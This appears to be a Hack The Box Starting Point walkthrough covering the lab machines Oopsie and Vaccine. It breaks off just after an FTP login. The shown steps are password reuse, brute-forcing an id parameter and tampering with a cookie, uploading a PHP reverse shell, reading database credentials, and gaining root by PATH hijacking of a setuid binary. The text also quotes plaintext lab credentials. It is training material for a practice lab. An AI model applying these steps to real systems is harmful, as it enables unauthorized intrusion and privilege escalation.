<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-06 03:34 EDT
Nmap scan report <span class="k">for</span> 10.10.10.28
Host is up <span class="o">(</span>0.037s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Welcome
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.92 seconds
</code></pre></td></tr></table>
</div>
</div><p>Nmap reveals reveals that SSH and Apache are available on their default
ports. Let&rsquo;s check out the website.</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"src="StartingPoint_11.png"></div> 
<p>It seems to be a website for the electric vehicle manufacturer MegaCorp.
Scrolling down, we note that a reference is made to logging in.</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%" src="StartingPoint_12.png"></div>  
<p>We cannot see anything else of interest, so let&rsquo;s send the request to a web proxy such as Burp, so we can examine the website in more detail.</p>
<p>We point the browser to the Burp proxy at <strong>127.0.0.1:8080</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="StartingPoint_13.png"></div> 
<p>Then we refresh the page, and forward the request.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image14.png"></div> 
<p>On the <strong>Target tab</strong>, we notice that Burp has passively spidered the website while processing the request.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"src="media/image15.png"></div> 
<p>We can see the url “<strong>/cdn-cgi/login</strong>”.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image16.png"></div> 
<p>We could have also simply used our browser; in Firefox we could have
inspected the web page, and we could have found the same url under the
<strong>Network Monitor</strong> tab:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image17.png"></div> 
<p>We could have just used “<strong>Edit and Resend</strong>”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image18.png"></div> 
<p>Just modify the URL into “<strong>http://10.10.10.28/cdn-cgi/login/</strong>”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image19.png"></div> 
<p>And click “Send”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image20.png"></div> 
<p>And the link to the login page appear in our list:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image21.png"></div> 
<p>Now just open it in a “New Tab”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image22.png"></div> 
<p>We confirm that this is a login page. Let&rsquo;s try to reuse the password
<strong>MEGACORP_4dm1n!!</strong> from the previously compromised machine, with
common usernames such as <strong>administrator</strong> or <strong>admin</strong> .</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%" src="media/image23.png"></div> 
This is successful, and we gain access to the web portal, which contains
additional functionality.
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image24.png"></div> 
<p>However, it seems the developer has implemented tiers of administration,
and the Uploads page is further restricted to the <strong>super admin</strong> user.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image25.png"></div> 
<p>Let&rsquo;s examine the URL:
“<strong>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=</strong>”</p>
<p>We can see that for <strong>id=1,</strong> we will have user <strong>admin</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image26.png"></div> 
<p>If we pick <strong>Id=4</strong>, the user is now <strong>john</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image27.png"></div> 
<p>Let’s examine the page in <em><strong>Burp</strong></em>. We refresh on the Accounts page,
which displays the user id for our current user, and intercept the
request. We notice what seems to be a custom cookie implementation,
comprising of the <strong>user</strong> value and <strong>role</strong>. We also notice the <strong>id</strong>
parameter, which for our current admin user is 1.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image28.png"></div> 
This shows that it might be possible to brute force the **id** values,
and display the **user** value for another user, such as the super admin
account.
<p>We can do this using by trying a series of id values, we will use Burp&rsquo;s
<strong>Intruder module</strong>.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image28.png"></div> 
<p>We press Clear to remove the pre-populated payload positions</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image29.png"></div> 
<p>We now select the Id value (1),</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image30.png"></div> 
<p>We click Add.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image31.png"></div> 
<p>Next, click on the Payloads tab.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image32.png"></div> 
<p>We can generate a sequential list of 1-100 using a simple shell  script</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  for i in \`seq 1 100\`; do echo \$i; done
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image34.png"></div> 
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image35.png"></div> 
<p>Paste the output into the Payloads box.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image36.png"></div> 
<p>Next we move to “Options” tab</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image37.png"></div> 
<p>We ensure that Follow Redirections is set to &ldquo;<strong>Always</strong>&rdquo;, and select
the option to &ldquo;<strong>Process cookies in redirections</strong>&rdquo;.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image38.png"></div> 
<p>Let’s click on the Target tab, and then click “<strong>Start attack</strong>”.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image39.png"></div> 
<p>We sort responses by Length, and view the results.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image40.png"></div> 
<p>A few of a responses have a different length, and we proceed to examine
them. The super admin account is visible, and <em><strong>corresponding user
value is identified</strong></em>(86575).</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image41.png"></div> 
<p>Let’s try to access the Uploads page again</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image42.png"></div> 
<p>Let’s substitute the user value (34322) with the super admins value
(86575).</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image43.png"></div> 
<p>Let’s click on “Forward” and see what the response into the browser
(let’s disable the proxy first)</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image44.png"></div> 
<p>Inspecting cookies, let’s see again the upload page:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image45.png"></div> 
<p>We can see that the user’s Value is “<strong>34322</strong>” with role “admin”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image46.png"></div> 
<p>Let’s try changing the users’ value into “<strong>86575</strong>” an see what happens
the we refresh the page</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image47.png"></div> 
<p>We do now have access as super admin:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image48.png"></div> 
<h3 id="9702-foothold-1">◦ Foothold</h3>
<p>===============</p>
<p>Let’s check if the developer forgot to implement user input validation,
and so we should test if we can upload other files, such as a PHP
webshell .Let’s locate the “php-reverse-shell .php” file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Oopsie$  locate  php-reverse-shell.php
/usr/share/laudandum/php/php-reverse-shell.php
/usr/share/laudandum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
kali@kali: ~/HTB/StartingPoint/Oopsie$ 
</code></pre></td></tr></table>
</div>
</div><p>Let’s save this file as “<strong>check.php</strong>”</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Oopsie$  cp /usr/share/webshells/php/php-reverse-shell.php  check.php
kali@kali: ~/HTB/StartingPoint/Oopsie$  ls
check.php
</code></pre></td></tr></table>
</div>
</div><p>Let’s now customize the file “check.php” file with our IP address and
the port values</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image51.png"></div> 
<p>Page reports that the upload of the “<strong>check.php</strong>” file was successful</p>
<div style="width:100%; background-color:white;text-align: center;;border: 1px solid black;" class="zoom"><img style="border:1px solid black;" width="50%"  src="media/image52.png"><img  width="50%"  src="media/image53.png"></div> 
<p>We don&rsquo;t know where the reverse shell  was uploaded to. Let&rsquo;s enumerate
the web server for common directories using a the dirsearch tool.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image54.png"></div> 
<p>Let’s run the script for “php” files.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image55.png"></div> 
<br>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image56.png"></div>
<br>
From the output we can see that tool identified the uploads folder.
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image57.png"></div> 
<p>We can set up our listener</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image58.png"></div> 
<p>Then we can trigger a reverse shell  using the curl command.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image59.png"></div> 
<p>Below a a shell  as <strong>www-data</strong> and proceed to upgrade it.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image60.png"></div> 
<p>Let’s upgrade the reverse shell  as follow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">SHELL=/bin/bash script -q /dev/null
&lt;Ctrl-Z&gt;
stty  raw -echo
fg
reset
xterm
</code></pre></td></tr></table>
</div>
</div><p>And we get the fully interactive shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@oopsie:/$

</code></pre></td></tr></table>
</div>
</div><h3 id="9702-lateral-movement">◦ Lateral Movement</h3>
<p>==================</p>
<p>The website records are probably retrieved from a database, so it&rsquo;s a
good idea to check for database connection information.</p>
<p>Let’s check for any db file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@oopsie:/$  locate db
</code></pre></td></tr></table>
</div>
</div><!-- <div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image62.png"></div>  -->
<p>And we eventually find the “<strong>/var/www/html/cdn-cgi/login/db.php</strong>” file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/var/lib/lxcf/….
/var/lib/lxcf/….
/var/lib/lxcf/….
/var/lib/man-db/….
/var/lib/mlocate/….
/var/lib/mlocate/….
/var/www/html/cdn-cgi/login/db.php
</code></pre></td></tr></table>
</div>
</div> <!-- <div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image63.png"></div> -->
<p>Let check the <strong>db.php</strong> file</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image64.png"></div> 
<p>From the php.net manual page
“https://www.php.net/manual/en/function.mysqli-connect.php”, we see how
<strong>mysqli_connect</strong> function works:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD,DB_NAME);&#34; 
</code></pre></td></tr></table>
</div>
</div><p>So let’s use the page credentials in db.php :</p>
<p>•	DB_USERNAME: <strong>robert</strong></p>
<p>•	DB_PASSWORD:<strong>M3g4C0rpUs3r!</strong></p>
<p>We can now use the “su (Switch User)” command to switch user and move laterally.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@oopsie:/$  su robert
Password:
robert@oopsie:/$  
</code></pre></td></tr></table>
</div>
</div><!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image65.png"></div> 
-->
<h3 id="9702--privilege-escalation-1">◦  Privilege Escalation</h3>
<p>======================</p>
<p>The <strong>id</strong> command reveals that <strong>robert</strong> is a member of the
<strong>bugracker</strong> group.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image66.png"></div> 
<p>We can enumerate the filesystem to see if this group has any special
acces</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  find  / -type  f  -group  bugtracker  2&gt;/dev/null
/usr/bin/bugtracker
</code></pre></td></tr></table>
</div>
</div><!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image67.png"></div> 
-->
<p>Let’s list what is inside the directory</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"> robert@oopsie:/$  ls -al /usr/bin/bugtracker
-rw*s*r-xr-- <span class="m">1</span>  root_bugtracker <span class="m">8792</span>  Jan  <span class="m">25</span> 10:14  /usr/bin/bugtracker
</code></pre></td></tr></table>
</div>
</div><!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image68.png"></div> 
-->
<p>We could have use also the following command to concatenate the two
commands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  find / -type f -group bugtracker 2&gt;/dev/null <span class="p">|</span> xargs  ls -al
</code></pre></td></tr></table>
</div>
</div><h4 id="x25b9--setuid">▹  <em><strong>Setuid</strong></em></h4>
<!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image69.png"></div> 
-->
<p>We can see that there is a special permission on the file “<strong>s</strong>”.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  ls -al /usr/bin/bugtracker
-rwsr-xr-- <span class="m">1</span>  root_bugtracker <span class="m">8792</span>  Jan  <span class="m">25</span> 10:14  /usr/bin/bugtracker
</code></pre></td></tr></table>
</div>
</div><p>That is the &ldquo;setuid&rdquo; bit, which tells the OS to execute that program
with the userid of its owner.This is typically used with files owned by
root to allow normal users to execute them as root with no external
tools (such as sudo).</p>
<p><strong>SUID</strong> is a special file permission for executable files which enables
other users to run the file with effective permissions of the file
owner. Instead of the normal x which represents execute permissions, you
will see an <strong>s</strong> (to indicate <strong>SUID</strong>) special permission for the
user.</p>
<p><strong>SGID</strong> is a special file permission that also applies to executable
files and enables other users to inherit the effective <strong>GID</strong> of file
group owner. Likewise, rather than the usual x which represents execute
permissions, you will see an <strong>s</strong> (to indicate <strong>SGID</strong>) special
permission for group user.</p>
<p>Let&rsquo;s run the <strong>bugtracker binary</strong> and see what it does.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image70.png"></div> 
<p>It seems to output a report based on the ID value provided. Let&rsquo;s use
strings to see how it does this.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  strings  /usr/bin/bugtracks
/lib64/ld-linux-x86-64.so.2
Libc.so.6
…..
…..
- - - - - - - - - - -
: EV Bug Tracker :
- - - - - - - - - - -
Provide Bug ID:
- - - - - - - - - - -
cat /root/reports/
<span class="p">;</span>*3$”
GCC: <span class="o">(</span>UBUNTU 7.4.0-1ubuntu1~18.04.1<span class="o">)</span> 7.4.0

</code></pre></td></tr></table>
</div>
</div><!-- <<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image71.png"></div> -->
<!-- <SNIP> -->
<!-- <<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image72.png"></div> -->
<p>We see that it calls the “<strong>cat”</strong> binary using this relative path
instead of the absolute path.</p>
<p>Let have a look to current $PATH</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image73.png"></div> 
<p>By creating a malicious cat and by modifying the path to include the
current working directory, we should be able to abuse this
misconfiguration, and escalate our privileges to root. Let&rsquo;s add the “<strong>tmp</strong>” directory to PATH</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
robert@oopsie:/$  <span class="nb">export</span> PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/games:/usr/local/games
</code></pre></td></tr></table>
</div>
</div><!-- <<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image74.png"></div> -->
<p>Then we move into the tmp folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/$  <span class="nb">cd</span> /tmp/
</code></pre></td></tr></table>
</div>
</div><p>Let’ create <em><strong>a malicious cat</strong></em>,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/tmp$  <span class="nb">echo</span> <span class="s1">&#39;/bin/sh&#39;</span> &gt; cat
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s make it executable.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/tmp$  chmod +x cat
</code></pre></td></tr></table>
</div>
</div><p>Now, after making our “malicious” cat executable if we search for the
cat executable with the “which” command we will see:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">robert@oopsie:/tmp$  which  –a  cat
/tmp/cat
/bin/cat

</code></pre></td></tr></table>
</div>
</div><!-- <<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image75.png"></div> -->
<p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for executable files (i.e., ready-to-run programs) in response to commands issued by a user.  The first “cat” command to be executed will be &ldquo;<strong>our malicious</strong>&rdquo; “/tmp/cat”, so by running the bugtracker binary we will have access to a root shell..</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image76.png"></div>
<p>If we check the current effective user ID with “whoami”, we will see that we are now <strong>root</strong>.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image77.png"></div> 
<h3 id="9702--post-exploitation">◦  Post Exploitation</h3>
<p>===================</p>
<p>Inside root&rsquo;s folder, we see a .config folder, which contains a
FileZilla config file with the credentials <strong>ftpuser</strong> and <strong>mc@F1l3ZilL4</strong>
visible in plain text.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image78.png"></div> 
<h2 id="9656-vaccine">▸ VACCINE</h2>
<h3 id="9702-about-1">◦ About</h3>
<p>This box features working with MD5 hashes and escaping user context to root by exploiting sudoer misconfiguration</p>
<ul>
<li>Machine : <b>Vaccine</b> </li>
<li>Ip: <b>10.10.10.46</b></li>
</ul>
<h3 id="9702-enumeration">◦ Enumeration</h3>
<p>======================</p>
<p><em><strong>nmap -sC -sV 10.10.10.46</strong></em></p>
<p>Running a simple Nmap scan reveals three open ports running, for FTP,
SSH and Apache respectively.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-03 10:28 EDT
Nmap scan report <span class="k">for</span> 10.10.10.46
Host is up <span class="o">(</span>0.041s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-cookie-flags: 
<span class="p">|</span>   /: 
<span class="p">|</span>     PHPSESSID: 
<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.64 seconds

</code></pre></td></tr></table>
</div>
</div><p>The credentials <strong>ftpuser</strong> with  <strong>mc@F1l3ZilL4</strong> can be used to login to the
FTP server.</p>
<p><em><strong>ftp 10.10.10.46</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ftp 10.10.10.46
Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.

